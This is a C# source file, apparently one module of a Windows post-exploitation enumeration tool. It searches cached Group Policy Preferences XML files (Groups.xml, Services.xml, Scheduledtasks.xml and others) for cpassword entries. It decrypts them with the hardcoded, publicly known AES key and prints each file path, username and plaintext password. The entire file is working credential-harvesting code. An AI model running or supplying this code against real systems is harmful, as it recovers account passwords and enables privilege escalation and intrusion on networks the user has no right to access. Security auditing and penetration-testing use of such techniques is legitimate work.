using System;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text;
using System.Xml;

namespace Gopher.Holes
{
	class GPP
	{
		private static string Decrypt(string cpassword)
		{
			int mod = cpassword.Length % 4;

			switch (mod)
			{
				case 1:
					cpassword = cpassword.Substring(0, cpassword.Length - 1);
					break;

				case 2:
					cpassword += "".PadLeft(4 - mod, '=');
					break;

				case 3:
					cpassword += "".PadLeft(4 - mod, '=');
					break;

				default:
					break;
			}

			byte[] decoded = Convert.FromBase64String(cpassword);
			AesCryptoServiceProvider aes = new AesCryptoServiceProvider();
			aes.IV = new byte[aes.IV.Length];
			aes.Key = new byte[]
			{
				0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9, 0xfa, 0xf4, 0x93, 0x10, 0x62, 0x0f, 0xfe, 0xe8,
				0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 0x79, 0x90, 0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b
			};

			return Encoding.Unicode.GetString(aes.CreateDecryptor().TransformFinalBlock(decoded, 0, decoded.Length));
		}

		public static string Dig()
		{
			string findings = "";
			string allUsersProfile = Environment.GetEnvironmentVariable("ALLUSERSPROFILE");

			if (!allUsersProfile.Contains("ProgramData"))
			{
				allUsersProfile += @"\Application Data";
			}

			allUsersProfile += @"\Microsoft\Group Policy\History\";

			List<string> files = new List<string>();
			files.AddRange(Utils.FindFiles(allUsersProfile, "Groups.xml"));
			files.AddRange(Utils.FindFiles(allUsersProfile, "Services.xml"));
			files.AddRange(Utils.FindFiles(allUsersProfile, "Scheduledtasks.xml"));
			files.AddRange(Utils.FindFiles(allUsersProfile, "DataSources.xml"));
			files.AddRange(Utils.FindFiles(allUsersProfile, "Printers.xml"));
			files.AddRange(Utils.FindFiles(allUsersProfile, "Drives.xml"));

			foreach (string file in files)
			{
				XmlDocument gpp = new XmlDocument();
				gpp.Load(file);

				if (gpp.InnerXml.Contains("cpassword"))
				{
					XmlNode properties;
					string username;
					string password;

					if (file.Contains("Groups.xml"))
					{
						properties = gpp.SelectSingleNode("/Groups/User/Properties");
						username = properties.Attributes["userName"].Value;
						password = properties.Attributes["cpassword"].Value;
					}
					else if (file.Contains("Services.xml"))
					{
						properties = gpp.SelectSingleNode("/NTServices/NTService/Properties");
						username = properties.Attributes["accountName"].Value;
						password = properties.Attributes["cpassword"].Value;
					}
					else if (file.Contains("Scheduledtasks.xml"))
					{
						properties = gpp.SelectSingleNode("/ScheduledTasks/Task/Properties");
						username = properties.Attributes["runAs"].Value;
						password = properties.Attributes["cpassword"].Value;
					}
					else if (file.Contains("DataSources.xml"))
					{
						properties = gpp.SelectSingleNode("/DataSources/DataSource/Properties");
						username = properties.Attributes["username"].Value;
						password = properties.Attributes["cpassword"].Value;
					}
					else if (file.Contains("Printers.xml"))
					{
						properties = gpp.SelectSingleNode("/Printers/SharedPrinter/Properties");
						username = properties.Attributes["username"].Value;
						password = properties.Attributes["cpassword"].Value;
					}
					else
					{
						properties = gpp.SelectSingleNode("/Drives/Drive/Properties");
						username = properties.Attributes["username"].Value;
						password = properties.Attributes["cpassword"].Value;
					}

					if (username != "" && password != "")
					{
						if (string.IsNullOrEmpty(findings))
						{
							findings += "\n# ---- Cached GPP files ---- #\n";
						}

						findings += string.Format("|\n|   Path     : {0}\n", file);
						findings += string.Format("|   Username : {0}\n", username);
						findings += string.Format("|   Password : {0}\n", Decrypt(password));
					}
				}
			}

			if (!string.IsNullOrEmpty(findings))
			{
				findings += "|\n# ---- #\n";
			}

			return findings;
		}
	}
}
